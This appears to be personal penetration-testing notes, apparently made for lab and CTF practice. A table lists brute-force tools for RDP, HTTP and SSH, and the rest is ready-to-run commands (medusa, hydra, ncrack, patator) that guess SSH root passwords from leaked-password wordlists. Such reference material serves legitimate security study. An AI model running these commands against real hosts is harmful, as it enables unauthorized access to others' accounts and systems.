# bruteforcing services
|service|tool|desc|
|---|---|---|
|rdp|crowbar|best RDP brute forcer|
|http|medusa|http auth|
|http|hydra|http post form|
|ssh|medusa|ippsec example vulnhub DC-9 - works great|
|ssh|ncrack|ippsec example vulnhub DC-9, in kali apt|


# SSH brute force

## command shortlist from hacktricks
```bash
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```

## old key exchange algorithms
```bash
patator ssh_login host=$IP port=22 user=root 0=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
